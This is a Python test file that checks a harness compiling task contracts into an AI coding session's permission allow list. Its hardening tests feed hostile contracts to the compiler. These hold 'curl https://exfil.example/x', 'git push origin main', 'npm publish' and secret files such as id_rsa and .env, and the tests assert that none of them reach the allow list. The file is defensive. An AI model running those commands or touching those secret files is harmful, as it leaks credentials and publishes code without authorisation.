"""Testes da superfície de permissions da sessão: contrato -> settings.json."""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from harness.session_permissions import (
    compile_session_permissions,
    render_session_permissions,
)

FEATURE_LIST = {
    "contract": "exemplo-feature",
    "compiled_at": "2026-07-15T12:00:00+00:00",
    "features": [
        {
            "id": "T-01",
            "desc": "Criar modulo de configuracao",
            "files": ["src/harness/config.py", "tests/test_config.py"],
            "verify_cmd": "pytest tests/test_config.py -q",
            "depends": [],
            "passes": False,
        },
        {
            "id": "T-02",
            "desc": "Integrar configuracao no compilador",
            "files": ["src/harness/compiler.py"],
            "verify_cmd": "pytest tests/test_config.py -q",  # repetido de propósito
            "depends": ["T-01"],
            "passes": False,
        },
    ],
}

PROFILE_WITH_EXTRAS = {
    "languages": [{"value": "python", "evidence": "pyproject.toml", "confidence": 1.0}],
    "package_manager": {"value": "npm", "evidence": "package-lock.json", "confidence": 1.0},
    "test_command": {"value": "pytest", "evidence": "pyproject.toml", "confidence": 1.0},
    "test_glob": {"value": "tests/**/*.py", "evidence": "tests/test_x.py", "confidence": 1.0},
    "extras": {
        "lint_command": {"value": "ruff check .", "evidence": "pyproject.toml", "confidence": 1.0},
        "typecheck_command": {"value": "mypy", "evidence": "mypy.ini", "confidence": 1.0},
        "build_command": {"value": "npm run build", "evidence": "package.json", "confidence": 1.0},
    },
    "unknowns": [],
    "analyzed_at": "2026-07-15T12:00:00+00:00",
    "manifest_snapshot": {},
}


def _write_feature_list(target: Path, data: dict) -> None:
    path = target / ".harness" / "feature_list.json"
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(data), encoding="utf-8")


def _write_profile(target: Path, data: dict) -> None:
    path = target / ".harness" / "repo-profile.json"
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(data), encoding="utf-8")


# ---------------- render_session_permissions ----------------

def test_files_from_all_features_without_duplicates() -> None:
    rules = render_session_permissions(FEATURE_LIST, None)
    allow = rules["allow"]
    assert allow.count("Edit(src/harness/config.py)") == 1
    assert allow.count("Write(src/harness/config.py)") == 1
    assert "Edit(tests/test_config.py)" in allow
    assert "Write(tests/test_config.py)" in allow
    assert "Edit(src/harness/compiler.py)" in allow
    assert "Write(src/harness/compiler.py)" in allow


def test_repeated_verify_cmd_becomes_single_bash_rule() -> None:
    rules = render_session_permissions(FEATURE_LIST, None)
    allow = rules["allow"]
    assert allow.count("Bash(pytest tests/test_config.py -q)") == 1


def test_profile_with_extras_adds_lint_typecheck_build() -> None:
    rules = render_session_permissions(FEATURE_LIST, PROFILE_WITH_EXTRAS)
    allow = rules["allow"]
    assert "Bash(ruff check .)" in allow
    assert "Bash(mypy)" in allow
    assert "Bash(npm run build)" in allow


def test_profile_none_does_not_break() -> None:
    rules = render_session_permissions(FEATURE_LIST, None)
    assert isinstance(rules["allow"], list)
    assert len(rules["allow"]) > 0


def test_output_never_contains_git_push_or_network_commands() -> None:
    for profile in (None, PROFILE_WITH_EXTRAS):
        rules = render_session_permissions(FEATURE_LIST, profile)
        allow_text = json.dumps(rules["allow"])
        assert "git push" not in allow_text
        assert "curl" not in allow_text
        assert "wget" not in allow_text


def test_git_local_floor_is_always_present() -> None:
    rules = render_session_permissions(FEATURE_LIST, None)
    for rule in ("Bash(git status)", "Bash(git log*)", "Bash(git diff*)",
                 "Bash(git add*)", "Bash(git commit*)"):
        assert rule in rules["allow"]


def test_package_manager_npm_generates_install_command() -> None:
    profile = {"package_manager": {"value": "npm", "evidence": "x", "confidence": 1.0}}
    rules = render_session_permissions(FEATURE_LIST, profile)
    assert "Bash(npm ci)" in rules["allow"]


def test_package_manager_explicit_none_value_does_not_raise() -> None:
    profile = {"package_manager": {"value": None, "evidence": "x", "confidence": 1.0}}
    rules = render_session_permissions(FEATURE_LIST, profile)
    assert not any("Bash(npm" in r or "Bash(pnpm" in r or "Bash(yarn" in r
                   or "Bash(uv" in r or "Bash(poetry" in r for r in rules["allow"])


def test_profile_extras_key_explicit_none_does_not_raise() -> None:
    profile = {"extras": None}
    rules = render_session_permissions(FEATURE_LIST, profile)
    assert isinstance(rules["allow"], list)


# ---------------- Gap 1 (hardening): runtime floor nunca ecoado no allow ----------------

def test_hostile_verify_cmd_git_push_is_not_echoed_in_allow() -> None:
    """Contrato mal-formado/malicioso com verify_cmd de push não pode fazer o
    settings.json compilado mentir sobre o que é permitido: mesmo o
    boundary_guard negando em runtime, a primeira camada (permissions
    nativas) não deve ecoar `Bash(git push origin main)` no allow."""
    hostile = {
        "contract": "hostil",
        "compiled_at": "2026-07-16T00:00:00+00:00",
        "features": [
            {
                "id": "T-01",
                "desc": "tarefa hostil",
                "files": ["src/app.py"],
                "verify_cmd": "git push origin main",
                "depends": [],
                "passes": False,
            }
        ],
    }
    rules = render_session_permissions(hostile, None)
    allow_text = json.dumps(rules["allow"])
    assert "git push" not in allow_text
    assert "Edit(src/app.py)" in rules["allow"]  # o resto da superfície continua normal


def test_hostile_env_file_is_not_echoed_in_allow() -> None:
    """Contrato com `.env` em files[] não pode virar `Edit(.env)`/`Write(.env)`
    no allow compilado, mesmo com o resto da tarefa legítimo."""
    hostile = {
        "contract": "hostil",
        "compiled_at": "2026-07-16T00:00:00+00:00",
        "features": [
            {
                "id": "T-01",
                "desc": "tarefa hostil",
                "files": [".env", "src/app.py"],
                "verify_cmd": "pytest -q",
                "depends": [],
                "passes": False,
            }
        ],
    }
    rules = render_session_permissions(hostile, None)
    assert "Edit(.env)" not in rules["allow"]
    assert "Write(.env)" not in rules["allow"]
    assert "Edit(src/app.py)" in rules["allow"]
    assert "Bash(pytest -q)" in rules["allow"]


def test_hostile_secret_variants_are_not_echoed_in_allow() -> None:
    """Variantes de arquivo de segredo (.pem, id_rsa, *credentials*) e de
    comando de rede/publicação (curl, npm publish) também são filtradas."""
    hostile = {
        "contract": "hostil",
        "compiled_at": "2026-07-16T00:00:00+00:00",
        "features": [
            {
                "id": "T-01",
                "desc": "tarefa hostil",
                "files": ["server.pem", "id_rsa", "aws_credentials.json", "src/app.py"],
                "verify_cmd": "curl https://exfil.example/x",
                "depends": [],
                "passes": False,
            },
            {
                "id": "T-02",
                "desc": "outra tarefa hostil",
                "files": ["src/util.py"],
                "verify_cmd": "npm publish",
                "depends": [],
                "passes": False,
            },
        ],
    }
    rules = render_session_permissions(hostile, None)
    allow = rules["allow"]
    for secret in ("server.pem", "id_rsa", "aws_credentials.json"):
        assert not any(secret in rule for rule in allow), (secret, allow)
    assert not any("curl" in rule for rule in allow)
    assert not any("npm publish" in rule for rule in allow)
    assert "Edit(src/app.py)" in allow
    assert "Edit(src/util.py)" in allow


# ---------------- SUBAGENTE 01: subcomandos do harness na superficie ----------------

def test_harness_cli_subcommands_are_in_allow() -> None:
    rules = render_session_permissions(FEATURE_LIST, None)
    allow = rules["allow"]
    assert "Bash(harness analyze*)" in allow
    assert "Bash(python -m harness.cli verify*)" in allow


def test_harness_run_subcommand_is_never_in_allow() -> None:
    rules = render_session_permissions(FEATURE_LIST, None)
    allow = rules["allow"]
    assert not any(rule.startswith("Bash(harness run") for rule in allow)
    assert not any(rule.startswith("Bash(python -m harness.cli run") for rule in allow)


# ---------------- compile_session_permissions ----------------

def test_compile_without_feature_list_raises(tmp_path: Path) -> None:
    with pytest.raises(FileNotFoundError, match="compile-contract"):
        compile_session_permissions(tmp_path)


def test_compile_preserves_manual_user_rule(tmp_path: Path) -> None:
    _write_feature_list(tmp_path, FEATURE_LIST)
    claude_dir = tmp_path / ".claude"
    claude_dir.mkdir()
    (claude_dir / "settings.json").write_text(json.dumps({
        "permissions": {"allow": ["Bash(npm run something-manual)"], "ask": ["Bash"]},
    }), encoding="utf-8")

    compile_session_permissions(tmp_path)

    settings = json.loads((claude_dir / "settings.json").read_text(encoding="utf-8"))
    assert "Bash(npm run something-manual)" in settings["permissions"]["allow"]
    assert settings["permissions"]["ask"] == ["Bash"]  # bucket ask intocado


def test_recompile_after_feature_removed_drops_its_permission_keeps_manual(tmp_path: Path) -> None:
    _write_feature_list(tmp_path, FEATURE_LIST)
    claude_dir = tmp_path / ".claude"
    claude_dir.mkdir()
    (claude_dir / "settings.json").write_text(json.dumps({
        "permissions": {"allow": ["Bash(npm run something-manual)"]},
    }), encoding="utf-8")

    compile_session_permissions(tmp_path)

    reduced = {
        "contract": "exemplo-feature",
        "compiled_at": "2026-07-15T12:00:00+00:00",
        "features": [FEATURE_LIST["features"][0]],  # remove T-02 (compiler.py)
    }
    _write_feature_list(tmp_path, reduced)
    compile_session_permissions(tmp_path)

    settings = json.loads((claude_dir / "settings.json").read_text(encoding="utf-8"))
    allow = settings["permissions"]["allow"]
    assert "Edit(src/harness/compiler.py)" not in allow
    assert "Write(src/harness/compiler.py)" not in allow
    assert "Edit(src/harness/config.py)" in allow  # feature T-01 permanece
    assert "Bash(npm run something-manual)" in allow  # manual preservada


def test_recompile_preserves_unrelated_keys_in_session_state(tmp_path: Path) -> None:
    _write_feature_list(tmp_path, FEATURE_LIST)
    state_path = tmp_path / ".harness" / "compiled-state-session.json"
    state_path.parent.mkdir(parents=True, exist_ok=True)
    state_path.write_text(json.dumps({
        "boundary_guard_hook_command": "python .harness/hooks/boundary_guard.py",
    }), encoding="utf-8")

    compile_session_permissions(tmp_path)

    state = json.loads(state_path.read_text(encoding="utf-8"))
    assert state["boundary_guard_hook_command"] == "python .harness/hooks/boundary_guard.py"
    assert "managed_session_permissions" in state


def test_compile_is_idempotent_no_duplicates(tmp_path: Path) -> None:
    _write_feature_list(tmp_path, FEATURE_LIST)
    compile_session_permissions(tmp_path)
    compile_session_permissions(tmp_path)

    settings = json.loads((tmp_path / ".claude" / "settings.json").read_text(encoding="utf-8"))
    allow = settings["permissions"]["allow"]
    assert allow.count("Bash(git status)") == 1
    assert allow.count("Edit(src/harness/config.py)") == 1


def test_compile_without_profile_is_not_an_error(tmp_path: Path) -> None:
    _write_feature_list(tmp_path, FEATURE_LIST)
    settings_path = compile_session_permissions(tmp_path)
    settings = json.loads(settings_path.read_text(encoding="utf-8"))
    assert "Bash(git status)" in settings["permissions"]["allow"]


def test_compile_creates_claude_dir_if_missing(tmp_path: Path) -> None:
    _write_feature_list(tmp_path, FEATURE_LIST)
    _write_profile(tmp_path, PROFILE_WITH_EXTRAS)
    settings_path = compile_session_permissions(tmp_path)
    assert settings_path.is_file()
    settings = json.loads(settings_path.read_text(encoding="utf-8"))
    assert "Bash(ruff check .)" in settings["permissions"]["allow"]
